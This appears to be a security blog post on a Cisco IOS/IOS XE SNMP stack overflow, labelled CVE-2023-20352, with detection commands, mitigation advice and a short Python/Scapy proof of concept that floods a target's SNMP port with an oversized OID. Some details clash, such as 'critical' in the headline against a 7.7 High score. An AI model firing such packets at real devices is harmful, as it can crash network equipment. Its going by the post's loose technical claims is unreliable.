CVE-2023-20352 is a critical stack overflow flaw in Cisco IOS/IOS XE's SNMP engine. With just crafted SNMP packets, remote attackers can crash systems or seize root control. All SNMP versions are vulnerable patch now or risk total compromise

*By Mark Malllia*

#### Introduction to SNMP
Simple Network Management Protocol (SNMP) is a foundational protocol in network administration, enabling system administrators to monitor, configure, and manage network devices. It operates on ports 161 (for SNMP requests) and 162 (for traps). SNMP supports three versions: v1, v2c, and v3, each offering varying levels of security.This one hits close to home my thesis focused on SNMP, and Cisco remains a staple in my daily work. 

SNMP's utility extends to real-time monitoring, inventory management, and fault detection across networks. Despite its importance, SNMP's role in network management also poses security risks when not properly secured, as seen in the CVE-2023-20352 vulnerability.

#### What Went Wrong: CVE-2023-20352 Explained
CVE-2023-20352 is a high-severity stack-based buffer overflow flaw affecting Cisco IOS and IOS XE devices. It resides in the SNMP subsystem, which processes network management traffic.

**Technical Details:**
- **Vulnerability Type:** Stack-based Buffer Overflow (CWE-121)
- **CVSS Score:** 7.7 (High)
- **Impact:** Potential Denial of Service (DoS) or Remote Code Execution (RCE)

The vulnerability is triggered by crafted SNMP packets sent to a vulnerable device, causing improper bounds checking and a stack overflow. All SNMP versions are affected.

#### Exploitation Scenarios
1. **Low Privilege Attack:**
   - **Access Required:** SNMPv2c read-only string or SNMPv3 credentials.
   - **Impact:** Device reload (DoS).

2. **High Privilege Attack:**
   - **Access Required:** SNMPv1/v2c string with privilege 15 credentials.
   - **Impact:** Full RCE as root.

#### Detection & Verification
To detect vulnerabilities, administrators can use the following CLI commands:
```bash
show running-config | include snmp-server community
show running-config | include snmp-server group
show snmp
```

#### Lock It Down: Mitigation Moves
- **Patch Application:** Cisco has released firmware patches for affected platforms.
- **Restrict SNMP Access:** Limit access to trusted IPs if you aren't already.
- **Disable Vulnerable OIDs:** Use commands like `snmp-server view <view-name> <OID> excluded`.

#### How Attackers Can Exploit It
A conceptual PoC using Python and Scapy demonstrates exploitability:

```python
from scapy.all import *

# Replace with target IP and SNMP community string
target_ip = "192.168.1.1"
community = "public"

# Craft malicious packet
payload = b"A" * 1024  # Overflow buffer
packet = IP(dst=target_ip)/UDP(dport=161)/SNMP(community=community, PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)]))

send(packet)
```

**Note:** This is a simplified example. Actual exploitation requires precise payload crafting and privilege escalation.

#### Conclusion
The CVE-2023-20352 vulnerability underscores SNMP's critical role and associated risks. Organizations must prioritize patching and securing SNMP configurations to mitigate threats, ensuring network resilience against emerging attacks.
